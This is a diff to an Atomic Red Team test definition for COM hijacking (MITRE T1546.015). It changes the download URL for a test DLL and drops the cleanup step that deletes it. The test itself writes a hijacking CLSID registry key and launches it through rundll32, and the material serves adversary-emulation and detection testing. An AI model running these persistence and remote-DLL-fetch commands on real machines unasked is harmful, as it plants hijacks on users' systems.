@@ -29,7 +29,7 @@ atomic_tests:
   dependencies:
   - description: DLL For testing
     prereq_command: 'if (Test-Path #{dllpath}) {exit 0} else {exit 1}'
-    get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/bin/AtomicTest.dll?raw=true" -OutFile "#{dllpath}"
+    get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll" -OutFile "#{dllpath}"
   executor:
     command: |-
       New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
@@ -38,5 +38,4 @@ atomic_tests:
       Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
     cleanup_command: |-
       Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Recurse -ErrorAction Ignore
-      Remove-Item #{dllpath} -ErrorAction Ignore
     name: powershell
